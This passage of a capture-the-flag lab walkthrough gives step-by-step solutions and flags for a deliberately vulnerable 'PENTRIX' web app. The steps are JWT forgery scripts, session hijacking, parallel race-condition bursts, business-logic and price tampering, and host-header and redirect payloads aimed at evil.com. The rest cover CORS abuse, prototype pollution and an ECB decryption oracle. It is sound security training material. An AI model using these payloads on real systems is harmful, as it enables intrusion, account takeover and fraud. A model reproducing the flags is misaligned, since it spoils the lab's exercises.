Why it works: TRACE is enabled and echoes the entire request, which is the primitive behind cross-site tracing attacks that steal reflected `Cookie`/`Authorization` headers.

**7. Exposed .env File** - `PENTRIX{misconfig_env}`
Request: `GET /misconfig/.env`
The file prints `DB_URL`, `STRIPE_SECRET_KEY`, `SESSION_SECRET`, and the admin API token flag.
Why it works: the environment file with production secrets sits where the web server serves it to anyone who asks.

**8. Debug Mode via Query Param** - `PENTRIX{misconfig_debug-param}`
Request: `GET /misconfig/info?debug=1`
The page renders a stack trace plus a config dump containing the debug token flag. (Plain `/misconfig/info` shows nothing.)
Why it works: a query-string switch flips on verbose debug output, leaking internals to any visitor who guesses the parameter.

**9. Default Credentials** - `PENTRIX{misconfig_manager}`
Request: `curl -u admin:admin http://localhost:3000/misconfig/manager`
Without credentials the panel returns 401; with `admin:admin` (HTTP Basic) it opens and the flag is awarded.
Why it works: the management panel is protected only by the vendor default credential, which was never changed.

**10. Robots.txt Disclosure** - `PENTRIX{misconfig_robots}`
`GET /misconfig/robots.txt` shows `Disallow: /misconfig/backup.zip`
`GET /misconfig/backup.zip` downloads a valid ZIP; `unzip -p backup.zip backup.txt` prints admin credentials and the backup token flag.
Why it works: robots.txt advertises the sensitive path, and the backup archive itself is downloadable.

**11. Unauthenticated HTTP PUT** - `PENTRIX{misconfig_put}`
Upload: `curl -X PUT -H "Content-Type: text/plain" --data-binary 'hello' http://localhost:3000/misconfig/files/pwn.txt` (201 Created)
Read back: `GET /misconfig/files/pwn.txt` prints the uploaded bytes and the flag is captured on the scoreboard.
Why it works: the endpoint accepts arbitrary file writes with no authentication, and the written file is served back raw, proving the write.
---

## jwt – JWT Attacks

**1. alg=none Accepted** – `PENTRIX{jwt_none-admin}`

Build an unsigned token by hand. Header `{"alg":"none","typ":"JWT"}` and payload
`{"user":"guest","role":"admin"}`, base64url-encoded, joined with dots and an
empty third segment:

```
node -e "
const b64u = o => Buffer.from(JSON.stringify(o)).toString('base64url');
const t = b64u({alg:'none',typ:'JWT'}) + '.' + b64u({user:'guest',role:'admin'}) + '.';
console.log(t);"
```

Paste the token into the form at `/jwt/none` and submit.

Why it works: the verifier treats `alg=none` as legitimate and checks only the
claims, so a self-written token with `role: admin` is accepted with no signature.

**2. Weak HMAC Secret** – `PENTRIX{jwt_weak-secret}`

Grab the guest token from `/jwt/weak` and decode it to confirm `alg` is `HS256`.
The secret is the guessable default `secret123`. Forge an admin token offline:

```
node -e "
const jwt = require('jsonwebtoken');
console.log(jwt.sign({user:'guest',role:'admin'}, 'secret123', {algorithm:'HS256'}));"
```

Submit it at `/jwt/weak`.

Why it works: HS256 security rests entirely on the secret, and a weak secret can
be guessed, letting anyone mint validly signed tokens.

**3. SQL Injection in kid Lookup** – `PENTRIX{jwt_kid-sqli}`

The server runs `SELECT key FROM jwt_keys WHERE kid='<kid from token>'` and
verifies your token with whatever key comes back. Inject through the `kid`
header so the query returns a key you chose:

```
node -e "
const jwt = require('jsonwebtoken');
const myKey = 'attackerkey1';
const kid = \"zzz' UNION SELECT '\" + myKey;
console.log(jwt.sign({user:'guest',role:'admin'}, myKey,
  {algorithm:'HS256', header:{kid}}));"
```

Submit the token at `/jwt/kid`.

Why it works: the interpolated `kid` lets you UNION in your own key, so the
server verifies your token against a secret you control.

**4. Untrusted jku Key Server** – `PENTRIX{jwt_jku}`

First publish your own key on the in-lab attacker key server. At
`/jwt/attacker-keys`, register kid `evil` with secret `evilsecret` (the page then
shows your JWKS URL, e.g. `http://localhost:3000/jwt/attacker-keys/jwks?kid=evil`).
Then mint a token whose `jku` header points at it:

```
node -e "
const jwt = require('jsonwebtoken');
console.log(jwt.sign({user:'guest',role:'admin'}, 'evilsecret', {algorithm:'HS256',
  header:{kid:'evil', jku:'http://localhost:3000/jwt/attacker-keys/jwks?kid=evil'}}));"
```

Submit it at `/jwt/jku`. (Adjust the host/port in `jku` to match your run.)

Why it works: the verifier fetches any `jku` URL with no allowlist and trusts
the keys it finds, so pointing it at your own key server hands you the signing key.

**5. RS256 / HS256 Algorithm Confusion** – `PENTRIX{jwt_alg-confusion}`

Copy the RSA public key from `/jwt/confusion-pubkey`. When the server sees
`alg: HS256` it uses the public key bytes as the HMAC secret, and the public key
is public. Sign an HS256 token with those bytes as the key:

```
node -e "
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
(async () => {
  const html = await (await fetch('http://localhost:3000/jwt/confusion-pubkey')).text();
  const pem = html.match(/<pre>([\s\S]*?)<\/pre>/)[1];
  console.log(jwt.sign({user:'guest',role:'admin'},
    crypto.createSecretKey(Buffer.from(pem)), {algorithm:'HS256'}));
})();"
```

Submit it at `/jwt/confusion`.

Why it works: the server confuses an asymmetric public key with a symmetric HMAC
secret, so the published public key becomes a valid signing key for HS256 tokens.

**6. Expiry Never Checked** – `PENTRIX{jwt_no-expiry}`

Copy the expired admin token shown on `/jwt/noexpiry` (it expired an hour ago)
and paste it into the form on the same page unchanged.

Why it works: the verifier passes `ignoreExpiration`, so the `exp` claim is
never enforced and a leaked old token replays forever.

**7. Audience Not Validated** – `PENTRIX{jwt_aud-bypass}`

Copy the partner token from `/jwt/aud`. It carries `"aud": "billing-service"` and
`role: admin`. Submit it at the same page's login form.

Why it works: the server verifies the signature but never checks the `aud`
claim, so a token minted for a different service is accepted here.

**8. Default Key for Missing kid** – `PENTRIX{jwt_kid-default}`

Tokens without a `kid` header fall back to the hardcoded default key `test`.
Sign a kid-less admin token with it:

```
node -e "
const jwt = require('jsonwebtoken');
console.log(jwt.sign({user:'guest',role:'admin'}, 'test', {algorithm:'HS256'}));"
```

Submit it at `/jwt/kiddefault`.

Why it works: the missing-kid fallback uses a predictable hardcoded secret, so
anyone who guesses it can mint valid tokens without a `kid` at all.
---

## session – Session Management

**1. Session Fixation** – `PENTRIX{session_fixation}`

Fix the session id before login, then log in as `admin` / `admin123`:

```
curl -c jar -b jar http://localhost:3000/session/fixation/preset -o /dev/null
curl -c jar -b jar --data-urlencode "username=admin" --data-urlencode "password=admin123" \
  http://localhost:3000/session/fixation/login
```

The login response shows the flag and the cookie is still `attacker123`.

Why it works: the server keeps the pre-login session id instead of regenerating
it at login, so an attacker-chosen id becomes the victim's authenticated session.

**2. Logout Does Not Destroy the Session** – `PENTRIX{session_logout}`

```
curl -c jar -b jar --data-urlencode "username=admin" --data-urlencode "password=admin123" \
  http://localhost:3000/session/logoutdemo/login -o /dev/null
curl -b jar http://localhost:3000/session/logoutdemo/logout -o /dev/null
curl -b jar http://localhost:3000/session/logoutdemo/secret
```

The secret page still opens after logout and shows the flag.

Why it works: logout only flips a flag on the server-side session instead of
deleting it, so the old cookie keeps working.

**3. Predictable Session IDs** – `PENTRIX{session_predictable}`

```
curl -c jar http://localhost:3000/session/predictable
```

The page shows your id (e.g. `1000`) and the admin's id right after yours
(e.g. `1001`). Set the admin's value as your cookie and open the admin panel:

```
curl -b <(printf 'localhost\tFALSE\t/\tFALSE\t0\tlab_sid\t1001\n') \
  http://localhost:3000/session/predictable/admin
```

(Replace `1001` with the admin id shown on your page.)

Why it works: session ids are sequential integers, so the admin's session id is
trivially guessable from your own.

**4. Session ID in the URL** – `PENTRIX{session_url}`

Visit `/session/urldemo` (this also seeds the admin's visit), then read the
proxy log at `/session/urldemo/proxy-log` and find the admin's URL:

```
GET /session/urldemo/home?sid=9dd444934bd24bb3367d3dd5bb30f089
```

Open that URL verbatim:

```
curl "http://localhost:3000/session/urldemo/home?sid=<admin-sid-from-log>"
```

Why it works: putting the sid in the URL leaks it into logs, and anyone who can
read the proxy log can replay the admin's session.

**5. Sessions Never Expire** – `PENTRIX{session_never-expires}`

Open `/session/legacy-archive` and copy the decade-old admin session id. Set it
as your `lab_sid` cookie and visit the legacy panel:

```
curl -b <(printf 'localhost\tFALSE\t/\tFALSE\t0\tlab_sid\t<archived-sid>\n') \
  http://localhost:3000/session/legacy-admin
```

Why it works: sessions live for 10 years, so a stolen session from a decade ago
is still accepted.

**6. Session ID in Debug Log** – `PENTRIX{session_log-leak}`

Open `/session/debug-log` and find the line `admin session started sid=<id>`.
Replay it as your cookie:

```
curl -b <(printf 'localhost\tFALSE\t/\tFALSE\t0\tlab_sid\t<sid-from-log>\n') \
  http://localhost:3000/session/leak-admin
```

Why it works: verbose debug logging writes live session ids to a readable log,
handing the admin's session to anyone who looks.
---

## race – Race Conditions

**1. Single-Use Coupon Redeemed Twice** – `PENTRIX{race_race-coupon}`
The coupon page redeems coupon RACE10 ($10 credit, one use). One click redeems it
once; twenty at the same instant redeem it many times:
```
curl -s http://localhost:3000/race/reset -o /dev/null
seq 1 20 | xargs -P20 -I{} curl -s -X POST http://localhost:3000/race/coupon/redeem
```
Reload `/race/coupon`: the one-use coupon shows several redemptions and the
credit is a multiple of $10. One of the responses contains the flag.
Why it works: the "already used?" check and the "mark used" write are separated
by an async pause, so parallel requests all read `used=false` before any write
lands (time-of-check to time-of-use).

**2. Double-Spend the Balance** – `PENTRIX{race_race-balance}`
The wallet holds $100. Fire 20 parallel transfers of the full $100:
```
curl -s http://localhost:3000/race/reset -o /dev/null
seq 1 20 | xargs -P20 -I{} curl -s -X POST http://localhost:3000/race/transfer -d 'to=attacker&amount=100'
```
Reload `/race/transfer`: the balance is deep negative (e.g. -$1900) and the
ledger lists all 20 transfers. One of the responses contains the flag.
Why it works: every request passes the `balance >= amount` check against the
same starting balance before any debit is applied, so the wallet spends money it
never had.

**3. Vote Counted Twice** – `PENTRIX{race_race-vote}`
The poll allows one vote per name. Two votes for the same name, sent in
parallel, both get recorded:
```
curl -s http://localhost:3000/race/reset -o /dev/null
seq 1 2 | xargs -P2 -I{} curl -s -X POST http://localhost:3000/race/vote -d 'name=voter1'
```
Reload `/race/vote`: `voter1` has 2 votes. (Voting twice sequentially is correctly
rejected with "Already voted"; only the parallel pair races.)
Why it works: the duplicate-name check and the vote insert are separated by an
async pause, so both requests pass the check before either insert happens.

**4. Referral Bonus Claimed Twice** – `PENTRIX{race_race-referral}`
Referral code REF2026 pays 50 points, claimable once. Claim it 10 times in
parallel:
```
curl -s http://localhost:3000/race/reset -o /dev/null
seq 1 10 | xargs -P10 -I{} curl -s -X POST http://localhost:3000/race/referral -d 'code=REF2026'
```
Reload `/race/referral`: claims and points are multiples of the single bonus.
Why it works: the "already claimed?" check races the claim write across the
async gap, so concurrent claims each see an unclaimed code.

**5. Duplicate Username Registration** – `PENTRIX{race_race-register}`
Usernames must be unique. Register the same name twice in parallel:
```
curl -s http://localhost:3000/race/reset -o /dev/null
seq 1 2 | xargs -P2 -I{} curl -s -X POST http://localhost:3000/race/register -d 'username=racer&password=hunter2'
```
Reload `/race/register`: two accounts named `racer` exist. (A sequential second
registration is correctly rejected with "Username taken".)
Why it works: the uniqueness check and the insert are separated by an async
pause, so both registrations pass the check before either row is inserted.

**6. Beat the AV Scan (TOCTOU)** – `PENTRIX{race_race-upload-scan}`
Uploads are served immediately but a simulated AV scan deletes each file 2
seconds later. Upload, then fetch within the window:
```
curl -s -X POST http://localhost:3000/race/upload -d 'filename=secret.txt&content=top+secret+lab+data'
curl -s http://localhost:3000/race/files/secret.txt
```
The second request returns the file content and the flag. Wait 3 seconds and
fetch again: `404: file not found`, the scan deleted it.
Why it works: the file is servable the instant it is stored while the delete
only runs later, a classic time-of-check to time-of-use gap between "stored" and
"scanned".

**7. Burst Through the Rate Limit** – `PENTRIX{race_race-ratelimit}`
The API allows 5 requests per window. The counter increments only after an async
gap, so a parallel burst all reads the old counter:
```
curl -s http://localhost:3000/race/reset -o /dev/null
seq 1 20 | xargs -P20 -I{} curl -s -X POST http://localhost:3000/race/ratelimit/hit
```
Reload `/race/ratelimit`: far more than 5 requests were counted as allowed in
one window. (Clicking sequentially stops at 5 with a 429, as intended.)
Why it works: the "under the limit?" check runs before the async pause and the
increment after it, so every request in the burst passes the check against a
stale counter.

**8. Oversell the Stock** – `PENTRIX{race_race-stock}`
Only 5 gadgets in stock. Order 5 twice, in parallel:
```
curl -s http://localhost:3000/race/reset -o /dev/null
seq 1 2 | xargs -P2 -I{} curl -s -X POST http://localhost:3000/race/stock/buy -d 'qty=5'
```
Reload `/race/stock`: 10 items sold from stock of 5, stock shows -5.
Why it works: the stock check and the decrement are separated by an async
pause, so both orders see the pre-sale stock of 5 and both go through.

---
---

## bizlogic – Business Logic Flaws

**1. Negative Quantity Credit** – `PENTRIX{bizlogic_biz-negative-qty}`
The checkout computes `$50 x qty` with no validation. Order -1 hoodies:
```
POST /bizlogic/negative-qty
qty=-1
```
Order total is -$50, so "charging" it credits the balance: $100 becomes $150
and the flag is awarded.
Why it works: a negative quantity turns the total negative, and subtracting a
negative total adds money instead of taking it.

**2. Client-Side Price Tampering** – `PENTRIX{bizlogic_biz-price-tamper}`
The buy form carries the price in a hidden field (`price=50`) and the server
charges whatever the browser sends:
```
POST /bizlogic/price-tamper/buy
product_id=hoodie&price=1
```
The $50 hoodie is bought for $1.00.
Why it works: the price is taken from client input and never re-checked against
the product catalog, so any submitted price is honored.

**3. Coupon Stacking Past 100%** – `PENTRIX{bizlogic_biz-coupon-stack}`
Three coupons are each "one per order": SAVE50, SAVE40, SAVE30. The discount
math adds every valid code with no cap:
```
POST /bizlogic/coupon-stack
codes=SAVE50,SAVE40,SAVE30
```
Total discount is 120%, the $50 hoodie costs -$10, and the shop pays you.
Why it works: percentages stack additively without a 100% ceiling, so combined
coupons drive the total at or below zero.

**4. OTP Verified by JavaScript** – `PENTRIX{bizlogic_biz-otp-client}`
The page JavaScript checks the OTP and sets a hidden `otp_ok=1` field; the
server only looks at that field. Skip the JavaScript entirely:
```
POST /bizlogic/otp/verify
otp=000000&otp_ok=1
```
The order is confirmed with a wrong OTP. (Entering the real demo code 739184
through the form also works but awards nothing.)
Why it works: verification happens in the browser, which the attacker controls;
the server trusts the client-supplied `otp_ok` flag instead of checking the code
itself.

**5. Checkout Step Skipped** – `PENTRIX{bizlogic_biz-workflow-skip}`
Checkout is cart, then payment, then confirm, but each step is just an endpoint
and confirm never verifies payment ran. Add to cart, then confirm directly:
```
POST /bizlogic/workflow/cart
product_id=hoodie

POST /bizlogic/workflow/confirm
```
The order is confirmed with "Payment step completed: false": a free hoodie.
Why it works: the confirm handler enforces no ordering of the workflow steps,
so the payment step can be skipped by calling the endpoint directly.

**6. Currency Confusion** – `PENTRIX{bizlogic_biz-currency}`
The $50 total is denominated in USD, but the server accepts any currency label
for that number and converts at face value:
```
POST /bizlogic/currency/pay
amount=50&currency=JPY
```
The $50 order settles as 50 JPY (about $0.34).
Why it works: a USD-denominated amount is accepted under a foreign currency
label with no real conversion, so the buyer chooses the cheapest currency.

**7. Email Change Without Re-Authentication** – `PENTRIX{bizlogic_biz-email-noreauth}`
The account email can be changed with no password confirmation, and
forgot-password sends the reset link to whatever address is on file:
```
POST /bizlogic/account/email
new_email=attacker@evil.com

POST /bizlogic/account/forgot
email=attacker@evil.com
```
The response shows the reset link (demo mode displays it). Open it and set a
new password: full account takeover, flag awarded.
Why it works: changing the email needs no re-authentication, so the attacker
reroutes the account's recovery channel to themselves and resets the password.

**8. Tampered Refund Amount** – `PENTRIX{bizlogic_biz-refund}`
Buy the $50 hoodie, then refund it. The refund form carries the amount in a
hidden field that the server never clamps to what was paid:
```
POST /bizlogic/refund/buy
product_id=hoodie

POST /bizlogic/refund
order_id=1&amount=5000
```
$5000 is refunded on a $50 order; the balance jumps accordingly.
Why it works: the refund amount is trusted from client input instead of being
looked up from the order, so any amount can be refunded.
---

## redirect - Open Redirect

**1. Protocol-Relative Redirect** - `PENTRIX{redirect_redirect-double-slash}`

```bash
curl -i "http://127.0.0.1:3109/redirect/go?next=//evil.com"
# HTTP/1.1 302 Found
# Location: //evil.com
```

Why it works: the `next` parameter is passed to the redirect with zero
validation, and a URL starting with `//` keeps the current scheme but navigates
to the attacker's host.

**2. javascript: Scheme Honored** - `PENTRIX{redirect_redirect-javascript}`

```bash
curl -i "http://127.0.0.1:3109/redirect/js?next=javascript:alert(1)"
# HTTP/1.1 302 Found
# Location: javascript:alert(1)
```

Why it works: the endpoint sets the `Location` header from user input with no
scheme allowlist, so a `javascript:` URL is honored verbatim.

**3. data: Scheme Honored** - `PENTRIX{redirect_redirect-data}`

```bash
curl -i "http://127.0.0.1:3109/redirect/data?next=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E"
# HTTP/1.1 302 Found
# Location: data:text/html,<script>alert(1)</script>
```

Why it works: same missing scheme check as lab 2; a `data:text/html` URL
smuggles a whole attacker-controlled document through the redirect.

**4. Backslash Allowlist Bypass** - `PENTRIX{redirect_redirect-backslash}`

```bash
curl -i "http://127.0.0.1:3109/redirect/trusted?next=https:%5C%5Cevil.com"
# HTTP/1.1 302 Found
# Location: https:\\evil.com
```

(`%5C` is a URL-encoded backslash, so the payload is `https:\\evil.com`.)
A plain `?next=https://evil.com` is rejected with 400, proving the check runs.

Why it works: the naive allowlist compares the raw string prefix instead of the
parsed hostname and accepts backslash as a separator, while browsers and the
URL parser normalize `\` to `/`, so the real destination is evil.com.

**5. OAuth Code Theft via redirect_uri** - `PENTRIX{redirect_redirect-oauth-theft}`

Full chain (the victim is simulated with a cookie jar):

```bash
B=http://127.0.0.1:3109
AUTHZ="/redirect/oauth/authorize?client_id=pentrix-app&redirect_uri=http://127.0.0.1:3109/redirect/evil-collect"

# 1. victim "logs in", then returns to the authorize URL
curl -c jar -b jar -s -o /dev/null "$B/redirect/oauth/victim-login?then=%2Fredirect%2Foauth%2Fauthorize%3Fclient_id%3Dpentrix-app%26redirect_uri%3Dhttp%253A%252F%252F127.0.0.1%253A3109%252Fredirect%252Fevil-collect"

# 2. victim approves the app -> 302 straight to the attacker's page with the code
LOC=$(curl -s -b jar -i -X POST \
  --data "client_id=pentrix-app&redirect_uri=http://127.0.0.1:3109/redirect/evil-collect" \
  "$B/redirect/oauth/consent" | grep -i "^location:" | tr -d '\r' | cut -d' ' -f2)
echo "$LOC"
# http://127.0.0.1:3109/redirect/evil-collect?code=<server-issued code>

# 3. the attacker's collector receives the genuine code -> flag
curl -s "$LOC" | grep -o "PENTRIX{[^}]*}"
```

Why it works: `redirect_uri` is never validated against the client's registered
URLs, so the authorization code is delivered to the attacker's collector, where
it can be exchanged for an access token.

**6. Parameter Pollution Picks Last** - `PENTRIX{redirect_redirect-pollution}`

```bash
curl -i "http://127.0.0.1:3109/redirect/polluted?next=safe&next=https://evil.com"
# HTTP/1.1 302 Found
# Location: https://evil.com
```

Why it works: with duplicate `next` parameters the code silently honors the
last value; the first one is only camouflage for anyone reviewing the link.
---

## hostheader - Host Header Injection

**1. Password Reset Poisoning** - `PENTRIX{hostheader_host-reset-poison}`

```bash
B=http://127.0.0.1:3109
# attacker requests a reset for the victim with a poisoned Host header
TOKEN=$(curl -s -H "Host: evil.com" --data "email=alice@pentrix.lab" \
  "$B/hostheader/forgot" | grep -o "token=[a-f0-9]*" | head -1 | cut -d= -f2)
# the emailed link now points at evil.com; victim "clicks" it -> token harvested
curl -s "$B/hostheader/evil-collect?token=$TOKEN" | grep -o "PENTRIX{[^}]*}"
```

Why it works: the reset link is built from the untrusted `Host` header, so the
victim's valid token is delivered to the attacker's domain.

**2. Cache Poisoning via Host** - `PENTRIX{hostheader_host-cache-poison}`

```bash
B=http://127.0.0.1:3109
# step 1: poison the cache (page is keyed by path only, not by host)
curl -s -H "Host: evil.com" "$B/hostheader/app" -o /dev/null
# step 2: visit as a normal user -> served the poisoned page -> flag
curl -s "$B/hostheader/app" | grep -o "PENTRIX{[^}]*}"
# cleanup for repeat runs
curl -s "$B/hostheader/app/clear" -o /dev/null
```

Why it works: the portal page is cached by path alone, so the copy rendered
under the attacker's `Host` is served to every later visitor.

**3. SSRF via Host Header** - `PENTRIX{hostheader_host-ssrf}`

```bash
curl -s -H "Host: 127.0.0.1:13919" http://127.0.0.1:3109/hostheader/status \
  | grep -o "PENTRIX{[^}]*}"
# the page also prints the exfiltrated JSON: db_password, admin_api_key
```

Why it works: the server-side health check builds its fetch URL from the `Host`
header, so pointing it at `127.0.0.1:13919` makes the server fetch the
loopback-only internal monitoring agent and return its secrets.

**4. X-Forwarded-Host Poisoning** - `PENTRIX{hostheader_host-xforwarded}`

```bash
B=http://127.0.0.1:3109
TOKEN=$(curl -s -H "X-Forwarded-Host: evil.com" --data "email=bob@pentrix.lab" \
  "$B/hostheader/forgot-xfwd" | grep -o "token=[a-f0-9]*" | head -1 | cut -d= -f2)
curl -s "$B/hostheader/evil-collect?token=$TOKEN" | grep -o "PENTRIX{[^}]*}"
```

Why it works: behind a proxy this reset page trusts `X-Forwarded-Host` over
`Host`; same poisoning, different header.

**5. X-Host-Override Poisoning** - `PENTRIX{hostheader_host-override}`

```bash
B=http://127.0.0.1:3109
TOKEN=$(curl -s -H "X-Host-Override: evil.com" --data "email=bob@pentrix.lab" \
  "$B/hostheader/forgot-override" | grep -o "token=[a-f0-9]*" | head -1 | cut -d= -f2)
curl -s "$B/hostheader/evil-collect?token=$TOKEN" | grep -o "PENTRIX{[^}]*}"
```

Why it works: a vendor-specific variant of the same flaw; `X-Host-Override`
wins over `Host` when building the reset link.

**6. Absolute Continue URL** - `PENTRIX{hostheader_host-abs-url}`

```bash
curl -i -H "Host: evil.com" --data "username=alice&password=alice123" \
  http://127.0.0.1:3109/hostheader/login
# HTTP/1.1 302 Found
# Location: http://evil.com/hostheader/dashboard
```

(Demo accounts: alice/alice123, bob/bob123.)

Why it works: the post-login redirect is an absolute URL built from the `Host`
header, so a poisoned header sends the freshly authenticated victim to the
attacker's domain.
---

## cors - CORS Misconfiguration

**1. Reflected Origin with Credentials** - `PENTRIX{cors_cors-reflect}`

```bash
curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-reflect&origin=https%3A%2F%2Fevil.com" \
  | grep -o "PENTRIX{[^}]*}"
# raw check: curl -si -H "Origin: https://evil.com" .../cors/api/profile
#   -> Access-Control-Allow-Origin: https://evil.com
#   -> Access-Control-Allow-Credentials: true
```

Why it works: the endpoint reflects any `Origin` with credentials allowed and
no allowlist at all, so any website can read authenticated responses.

**2. Null Origin Trusted** - `PENTRIX{cors_cors-null}`

```bash
curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-null&origin=null" \
  | grep -o "PENTRIX{[^}]*}"
# raw check: curl -si -H "Origin: null" .../cors/api/settings
#   -> Access-Control-Allow-Origin: null + Access-Control-Allow-Credentials: true
```

Why it works: `Origin: null` (sandboxed iframes, file:// pages) is trusted with
credentials, handing the data to attacker-controlled null-origin contexts.

**3. Regex Allowlist Bypass** - `PENTRIX{cors_cors-regex}`

```bash
curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-regex&origin=https%3A%2F%2Fpentrix.lab.evil.com" \
  | grep -o "PENTRIX{[^}]*}"
```

Why it works: the naive regex `^https://.*pentrix\.lab` has no subdomain
boundary and no end anchor, so `https://pentrix.lab.evil.com` matches while not
being under pentrix.lab. (Note: the commonly written anchored form
`^https://.*\.pentrix\.lab$` would NOT match this payload - the missing dot
before `pentrix` and the missing `$` are exactly the naive mistakes.)

**4. Wildcard on Sensitive Data** - `PENTRIX{cors_cors-wildcard-data}`

```bash
curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-wildcard-data&origin=https%3A%2F%2Fevil.com" \
  | grep -o "PENTRIX{[^}]*}"
# raw check: curl -si .../cors/api/users
#   -> Access-Control-Allow-Origin: *  + every user's email in the body
```

Why it works: a wildcard origin on an endpoint returning sensitive user data
means literally any website can read it.

**5. Subdomain Suffix Check** - `PENTRIX{cors_cors-subdomain}`

```bash
curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-subdomain&origin=https%3A%2F%2Fevil.trusted.pentrix.lab" \
  | grep -o "PENTRIX{[^}]*}"
```

Why it works: the check is only `hostname.endsWith('.trusted.pentrix.lab')`
with no allowlist of real subdomains, so an attacker-controlled subdomain
passes.

**6. Exposed Admin Token Header** - `PENTRIX{cors_cors-expose-headers}`

```bash
curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-expose-headers&origin=https%3A%2F%2Fevil.com" \
  | grep -o "PENTRIX{[^}]*}"
# raw check: curl -si .../cors/api/token
#   -> X-Admin-Token: <secret>  +  Access-Control-Expose-Headers: X-Admin-Token
```

Why it works: the sensitive `X-Admin-Token` response header is listed in
`Access-Control-Expose-Headers`, so any website the victim visits can read it
with JavaScript.
---

## proto – Prototype Pollution

**1. Query-String Pollution** – `PENTRIX{proto_proto-query}`
1. Merge the payload (brackets URL-encoded for curl):
   `curl -c jar -b jar "http://localhost:3000/proto/query?__proto__%5Brole%5D=admin"`
2. Open the admin check in the same session:
   `curl -c jar -b jar "http://localhost:3000/proto/query/admin"`
   The page prints `PENTRIX{proto_proto-query}`.
Why it works: the nested query parser keeps `__proto__` as a real key and the naive `merge()` walks it straight onto `Object.prototype`, so a brand-new `{}` inherits `role = 'admin'`.

**2. JSON Body Pollution** – `PENTRIX{proto_proto-json}`
1. POST a JSON body with a literal `__proto__` key:
   `curl -c jar -b jar -X POST http://localhost:3000/proto/json/merge -H 'Content-Type: application/json' -d '{"__proto__": {"role": "admin"}}'`
2. `curl -c jar -b jar http://localhost:3000/proto/json/admin` prints `PENTRIX{proto_proto-json}`.
Why it works: `JSON.parse` creates an own property literally named `__proto__`, and the merge copies it onto `Object.prototype` with no key filtering.

**3. Blacklist Bypass via constructor** – `PENTRIX{proto_proto-constructor}`
1. The merge drops any key containing the literal string `__proto__`. Take the other entrance to the prototype chain:
   `curl -c jar -b jar "http://localhost:3000/proto/constructor?constructor%5Bprototype%5D%5Brole%5D=admin"`
2. `curl -c jar -b jar http://localhost:3000/proto/constructor/admin` prints `PENTRIX{proto_proto-constructor}`.
Why it works: `constructor.prototype` reaches the very same `Object.prototype`, and the blacklist only blocks the literal `__proto__` spelling, so the merge pollutes through the back door.

**4. Polluting toString** – `PENTRIX{proto_proto-dos}`
1. `curl "http://localhost:3000/proto/dos?__proto__%5BtoString%5D=boom"`
2. The response is the crash page ("The widget broke") containing `PENTRIX{proto_proto-dos}`.
Why it works: `__proto__[toString]=boom` merges the string `"boom"` into the widget's per-request prototype scope, so the page's `` `${widget}` `` coercion calls a non-function `toString` and throws; the crash handler awards the flag.

**5. Client-Side Pollution** – `PENTRIX{proto_proto-client}`
1. Open `http://localhost:3000/proto/client?__proto__[theme]=dark` in a real browser.
2. The page's in-browser parser + naive merge pollutes `Object.prototype` in that page, the theme box renders `dark` (read from a fresh `{}`), and the page auto-reports to `/proto/client/claim?theme=dark`, which prints `PENTRIX{proto_proto-client}`.
Why it works: the vulnerable merge runs in the victim's browser, so a `__proto__[theme]` query parameter changes what every fresh object in the page reads; the page itself reports the demonstrated value to the claim endpoint.
(Verified by executing the page's exact script with a simulated DOM: a fresh `{}` read `theme = 'dark'` and the script built the claim redirect.)

**6. Unicode Escape Bypass** – `PENTRIX{proto_proto-unicode-bypass}`
1. The merge endpoint rejects raw bodies containing the literal string `__proto__` (400). Smuggle it as JSON escapes, sent as `text/plain` so the server sees your exact bytes:
   `curl -c jar -b jar -X POST http://localhost:3000/proto/unicode/merge -H 'Content-Type: text/plain' --data-binary '{"\u005f\u005fproto\u005f\u005f": {"role": "admin"}}'`
   The response says "Blacklist passed".
2. `curl -c jar -b jar http://localhost:3000/proto/unicode/admin` prints `PENTRIX{proto_proto-unicode-bypass}`.
Why it works: the blacklist scans the raw text, but `JSON.parse` decodes `\u005f` escapes after the scan, so the forbidden `__proto__` key materializes inside the merge.
---

## crypto – Cryptographic Failures

**1. Predictable Reset PIN** – `PENTRIX{crypto_crypto-rand-pin}`
1. `curl -c jar -b jar -X POST http://localhost:3000/crypto/pin/generate`
2. Brute-force `000000`-`999999` against `POST /crypto/pin/verify` with `pin=<guess>` as a form field. There is no rate limiting. A script with 100 concurrent keep-alive connections found the PIN in about 72 seconds (206,469 guesses, roughly 2,800 requests/second); the winning response contains `PENTRIX{crypto_crypto-rand-pin}`.
Why it works: the PIN comes from `Math.random`, which is not a CSPRNG, and a 6-digit space with no lockout is trivially enumerable by script.

**2. ECB Decryption Oracle** – `PENTRIX{crypto_crypto-ecb-oracle}`
1. Find the block size: `POST /crypto/ecb/encrypt` with `inhex=` set to `41` repeated N times. The hex ciphertext (in `<code id="ct">`) grows from 32 to 48 bytes at a 4-byte prefix, so the block size is 16. (Careful: when prefix + secret exactly fills a block, PKCS#7 appends a full pad block, which also grows the ciphertext.)
2. Confirm ECB: encrypt 48 identical bytes (`41` x 48 as hex); the ciphertext shows three identical 16-byte blocks.
3. Find the secret length: first growth at prefix 4, and a disambiguation probe at prefix 19 still returns 48 bytes (not 64), so the length is 28, not 29.
4. Decrypt byte-at-a-time: for byte `i`, send a prefix of `15 - (i mod 16)` bytes so the unknown byte lands at the end of block `floor(i/16)`. Build a dictionary of that block's ciphertext for all 256 possible last-byte values (`prefix || known || guess`), then look up the block from the prefix-only query. Repeat for all 28 bytes.
5. `POST /crypto/ecb/solve` with `plaintext=<recovered secret>`. The attack recovered `O0R6LQSmrFzKTjqy996nBOUrCxQ=` (28 bytes; the secret is random per boot) and the response contained `PENTRIX{crypto_crypto-ecb-oracle}`.
Why it works: ECB encrypts identical plaintext blocks to identical ciphertext blocks, so attacker-controlled prefix bytes can align each unknown secret byte to a block boundary and identify it by dictionary comparison.

**3. CBC Bit-Flipping** – `PENTRIX{crypto_crypto-cbc-bitflip}`
1. `curl -c jar -b jar -X POST http://localhost:3000/crypto/cbc/login` and copy the base64 cookie from `<code id="ck">`.
2. Decode it: the first 16 bytes are the IV, the rest is `AES-128-CBC(iv, '{"role":"guest","user":"guest"}')`. The string `"guest"` (the role value) sits at plaintext bytes 9-13, directly under the IV.
